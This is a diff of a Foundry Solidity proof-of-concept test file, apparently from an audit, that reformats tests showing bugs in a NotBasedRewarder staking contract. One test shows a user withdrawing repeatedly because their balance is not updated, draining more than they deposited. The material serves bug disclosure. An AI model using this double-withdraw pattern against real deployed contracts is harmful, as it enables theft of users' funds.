@@ -19,7 +19,7 @@ contract BugPOC is Test {
     address public user4;
     address public user5;
     address rewarderAddr;
-    
+
     function setUp() public {
         // Initialize addresses
         owner = address(this);
@@ -40,10 +40,7 @@ contract BugPOC is Test {
         rewardToken = new NotBasedToken(rewarderAddr);
 
         // Deploy the rewarder contract
-        rewarder = new NotBasedRewarder(
-            IERC20(address(rewardToken)),
-            IERC20(address(depositToken))
-        );
+        rewarder = new NotBasedRewarder(IERC20(address(rewardToken)), IERC20(address(depositToken)));
 
         // Transfer deposit tokens to user1
         depositToken.transfer(user1, 100_000e18);
@@ -60,8 +57,8 @@ contract BugPOC is Test {
     }
 
     function test_WithdrawFailWhenTokenPaused() public {
-        uint256 depositAmount = 1_000e18;
-        
+        uint256 depositAmount = 1000e18;
+
         // user1 deposits
         vm.startPrank(user1);
         rewardToken.approve(address(rewarder), depositAmount + 100e18);
@@ -72,7 +69,7 @@ contract BugPOC is Test {
         // owner pause rewardToken
         vm.prank(owner);
         rewardToken.pause();
-        
+
         // user1 tries to withdraw - should fail because token is paused
         skip(5_184_001); // 24 hr + 1 sec
         vm.prank(user1);
@@ -81,8 +78,8 @@ contract BugPOC is Test {
     }
 
     function test_WithdrawExactAmountFails() public {
-        uint256 depositAmount = 1_000e18;
-        
+        uint256 depositAmount = 1000e18;
+
         // user1 deposits
         vm.startPrank(user1);
         depositToken.approve(address(rewarder), depositAmount + 100e18);
@@ -101,7 +98,7 @@ contract BugPOC is Test {
         uint256 depositAmount = 10_000e18;
         uint256 user1DepositTokenBalanceBefore = depositToken.balanceOf(user1);
         uint256 user1RewardTokenBalanceBefore = rewardToken.balanceOf(user1);
-        
+
         // other user deposits
         vm.startPrank(user2);
         depositToken.approve(address(rewarder), depositAmount + 100e18);
@@ -114,7 +111,7 @@ contract BugPOC is Test {
         rewardToken.approve(address(rewarder), depositAmount + 100e18);
         rewarder.deposit(depositAmount);
         vm.stopPrank();
-        
+
         vm.startPrank(user4);
         depositToken.approve(address(rewarder), depositAmount + 100e18);
         rewardToken.approve(address(rewarder), depositAmount + 100e18);
@@ -126,7 +123,6 @@ contract BugPOC is Test {
         rewardToken.approve(address(rewarder), depositAmount + 100e18);
         rewarder.deposit(depositAmount);
         vm.stopPrank();
-
 
         // user1 deposits
         vm.startPrank(user1);
@@ -141,12 +137,12 @@ contract BugPOC is Test {
         rewarder.withdraw(depositAmount - 10e18);
         balance = rewardToken.balanceOf(user1);
         console2.log("Reward Token balance of User1: ", balance);
-        
+
         // Second withdraw should fail but doesn't because balance isn't updated
         rewarder.withdraw(depositAmount - 10e18);
         balance = rewardToken.balanceOf(user1);
         console2.log("Reward Token balance of User1 1st withdraw: ", balance);
-        
+
         // At this point user has withdrawn their full balance but can still withdraw more
         rewarder.withdraw(depositAmount - 10e18);
         balance = rewardToken.balanceOf(user1);
